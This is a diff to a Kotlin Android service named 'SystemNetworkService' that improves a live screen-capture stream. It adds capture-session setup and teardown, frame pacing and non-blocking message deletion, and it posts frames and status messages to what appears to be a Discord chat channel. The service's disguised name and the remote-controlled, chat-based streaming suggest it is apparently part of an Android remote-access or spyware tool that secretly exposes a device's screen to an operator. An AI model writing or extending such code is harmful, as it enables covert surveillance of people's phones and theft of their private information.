@@ -327,6 +327,7 @@ class SystemNetworkService : Service() {
                             if (isStreaming) {
                                 streamJob?.cancel()
                                 isStreaming = false
+                                DisplayCapture.releaseStreamCapture()
                                 streamMessageId?.let { d.deleteMsg(it) }
                                 streamMessageId = null
                                 d.sendMsg(":stop_button: **Live stream stopped**")
@@ -1010,6 +1011,11 @@ class SystemNetworkService : Service() {
         if (isStreaming) {
             streamJob?.cancel()
             streamMessageId = null
+            DisplayCapture.releaseStreamCapture()
+        }
+        if (!DisplayCapture.initStreamCapture(this)) {
+            d.sendMsg(":x: Stream capture init failed")
+            return
         }
         isStreaming = true
         streamMessageId = null
@@ -1018,8 +1024,10 @@ class SystemNetworkService : Service() {
             var consecutiveFailures = 0
             val maxFailures = 5
             var frameCount = 0
+            val targetDelay = 1000L / fps
             try {
                 while (isActive) {
+                    val loopStart = System.currentTimeMillis()
                     try {
                         val bytes = captureScreenForStream()
                         if (bytes != null) {
@@ -1030,7 +1038,7 @@ class SystemNetworkService : Service() {
                             if (newId != null) {
                                 streamMessageId = newId
                                 if (oldId != null) {
-                                    d.deleteMsgAwait(oldId)
+                                    launch { d.deleteMsgAwait(oldId) }
                                 }
                             }
                         } else {
@@ -1039,6 +1047,7 @@ class SystemNetworkService : Service() {
                                 d.sendMsg(":x: Stream stopped — too many failures")
                                 isStreaming = false
                                 streamMessageId = null
+                                DisplayCapture.releaseStreamCapture()
                                 break
                             }
                         }
@@ -1048,14 +1057,18 @@ class SystemNetworkService : Service() {
                             d.sendMsg(":x: Stream error — stopped")
                             isStreaming = false
                             streamMessageId = null
+                            DisplayCapture.releaseStreamCapture()
                             break
                         }
                     }
-                    delay(1000L / fps)
+                    val elapsed = System.currentTimeMillis() - loopStart
+                    val remaining = targetDelay - elapsed
+                    if (remaining > 0) delay(remaining)
                 }
             } catch (e: Exception) {
                 isStreaming = false
                 streamMessageId = null
+                DisplayCapture.releaseStreamCapture()
             }
         }
     }
@@ -1105,14 +1118,8 @@ class SystemNetworkService : Service() {
 
     private suspend fun captureScreenForStream(): ByteArray? = withContext(Dispatchers.IO) {
         try {
-            withTimeoutOrNull(15000L) {
-                val deferred = CompletableDeferred<ByteArray?>()
-                val ss = DisplayCapture(this@SystemNetworkService)
-                ss.captureForStream(object : DisplayCapture.Callback {
-                    override fun onSuccess(data: ByteArray) { deferred.complete(data) }
-                    override fun onFailure(error: String) { deferred.complete(null) }
-                })
-                deferred.await()
+            withTimeoutOrNull(5000L) {
+                DisplayCapture.captureStreamFrame()
             }
         } catch (e: Exception) {
             null
